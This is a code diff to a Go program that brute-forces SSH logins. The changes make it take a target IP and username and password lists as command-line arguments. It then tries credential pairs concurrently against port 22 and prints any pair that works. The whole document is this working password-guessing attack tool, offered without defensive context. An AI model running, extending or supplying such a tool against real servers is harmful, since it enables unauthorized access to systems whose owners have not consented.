@@ -11,23 +11,31 @@ import (
 	"time"
 )
 
+var ip string
+
+var userfile string
+var passfile string
+const THREADS = 8
+var pipeline = make(chan int, THREADS)
+
+
+
+	
+
+
 func main() {
 
-	const THREADS = 8
+	if len(os.Args) < 4 {
 
-	pipeline := make(chan int, THREADS)
+		fmt.Println("USAGE : ./bc [IP address][usernamelist] [passwordlist]")
+		os.Exit(1)
+	}else{
 
-	var ip string
+		ip = os.Args[1]
+		userfile = os.Args[2]
+		passfile = os.Args[3] 		
+	}
 
-	var userfile string
-	var passfile string
-
-	fmt.Println("Enter IP")
-	fmt.Scanf("%s", &ip)
-	fmt.Println("Enter path to username file")
-	fmt.Scanf("%s", &userfile)
-	fmt.Println("Enter path to password file")
-	fmt.Scanf("%s", &passfile)
 	//fmt.Println(len(os.Args))
 
 	var wg sync.WaitGroup
@@ -62,6 +70,8 @@ func main() {
 
 }
 
+
+
 func readFile(file string) (data []string, err error) {
 
 	buffer, err := os.Open(file)
@@ -74,16 +84,16 @@ func readFile(file string) (data []string, err error) {
 	scanner := bufio.NewScanner(buffer)
 	for scanner.Scan() {
 		data = append(data, scanner.Text())
-		fmt.Println(data)
+		//fmt.Println(data)
 	}
 
 	return
 }
 
-func knock(ip string) {
+func knock(ipad string) {
 
-	ip = ip + ":22"
-	conn, err := net.Dial("tcp", ip)
+	ipad = ip + ":22"
+	conn, err := net.Dial("tcp", ipad)
 	if err != nil {
 		fmt.Println("Is the port open ? or are you connected to the internet")
 
@@ -97,7 +107,7 @@ func knock(ip string) {
 func ssh_connect(wg *sync.WaitGroup, user, pass string) {
 	defer wg.Done()
 
-	fmt.Println("Trying %s :: %s", user, pass)
+	fmt.Printf("Trying %s :: %s\n", user, pass)
 	sshConfig := &ssh.ClientConfig{
 		User: user,
 		Auth: []ssh.AuthMethod{
@@ -112,7 +122,8 @@ func ssh_connect(wg *sync.WaitGroup, user, pass string) {
 
 	if err != nil {
 
-		<-pipeline
+		
+		<- pipeline
 
 		return
 	}
@@ -121,6 +132,7 @@ func ssh_connect(wg *sync.WaitGroup, user, pass string) {
 
 	fmt.Printf("USERNAME AND PASSWORD FOUND -> %s:%s\n", user, pass)
 
-	<-pipeline
+	<- pipeline
+	
 
 }
